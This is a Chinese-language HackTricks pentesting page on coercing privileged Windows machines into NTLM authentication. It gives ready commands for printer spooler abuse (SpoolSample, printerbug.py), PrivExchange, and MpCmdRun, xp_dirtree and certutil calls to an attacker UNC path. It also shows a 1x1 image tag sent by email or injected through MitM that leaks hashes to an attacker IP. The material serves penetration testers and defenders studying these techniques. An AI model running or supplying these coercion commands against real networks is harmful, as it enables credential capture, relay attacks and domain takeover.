# 强制 NTLM 特权认证

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？你想在**HackTricks**中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**推特**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧。**

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) 是一个用C#编写的**远程认证触发器集合**，使用MIDL编译器以避免第三方依赖。

## 打印机服务滥用

如果_**打印机服务**_已**启用**，你可以使用一些已知的AD凭据向域控制器的打印服务器**请求**新打印作业的**更新**，并告诉它将通知**发送到某个系统**。\
注意，当打印机向任意系统发送通知时，它需要对该**系统**进行**认证**。因此，攻击者可以使_**打印机服务**_对任意系统进行认证，服务将在此认证中**使用计算机账户**。

### 在域上查找Windows服务器

使用PowerShell，获取Windows机器列表。服务器通常是优先考虑的，所以我们先关注这里：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 查找正在监听的Spooler服务

使用稍作修改的@mysmartlogin（Vincent Le Toux）的[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看Spooler服务是否在监听：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
您也可以在Linux上使用rpcdump.py，并寻找MS-RPRN协议。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 要求服务对任意主机进行身份验证

您可以从[**这里编译SpoolSample**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**。**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
或者如果您使用的是Linux，可以使用 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 或 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### 结合无限制委派

如果攻击者已经攻破了一个具有[无限制委派](unconstrained-delegation.md)的计算机，攻击者可以**让打印机对这台计算机进行认证**。由于无限制委派，**打印机的计算机账户的TGT**将会被**保存在**具有无限制委派的计算机的**内存**中。由于攻击者已经攻破了这台主机，他将能够**检索这个票据**并滥用它（[传递票据](pass-the-ticket.md)）。

## RCP 强制认证

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange`攻击是由于在**Exchange Server `PushSubscription`功能**中发现的一个缺陷。这个功能允许任何拥有邮箱的域用户强制Exchange服务器通过HTTP对任何客户端提供的主机进行认证。

默认情况下，**Exchange服务以SYSTEM身份运行**并被赋予过多的权限（具体来说，它在2019年累积更新前对域具有**WriteDacl权限**）。这个缺陷可以被利用来启用**信息的中继到LDAP并随后提取域的NTDS数据库**。在无法中继到LDAP的情况下，这个缺陷仍然可以被用来中继和认证到域内的其他主机。成功利用这个攻击可以立即用任何经过认证的域用户账户访问域管理员。

## Windows内部

如果你已经进入了Windows机器，你可以强制Windows使用具有特权的账户连接到服务器，使用：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
或使用此其他技术：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用 certutil.exe lolbin（Microsoft签名的二进制文件）来强制 NTLM 认证：
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML 注入

### 通过电子邮件

如果您知道登录您想要攻破的计算机的用户的**电子邮件地址**，您可以向他发送一封包含**1x1图像**的**电子邮件**，例如
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

如果你能对一台计算机执行MitM攻击，并在他将要查看的页面中注入HTML，你可以尝试在页面中注入如下图像：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## 破解 NTLMv1

如果你能够捕获 [NTLMv1 挑战，请阅读这里了解如何破解它们](../ntlm/#ntlmv1-attack)。\
_记住，为了破解 NTLMv1，你需要将 Responder 挑战设置为 "1122334455667788"_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 **HackTricks** 中看到你的**公司广告**吗？或者你想要访问**最新版本的 PEASS 或下载 HackTricks 的 PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏。
* 获取[**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **推特** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我。
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
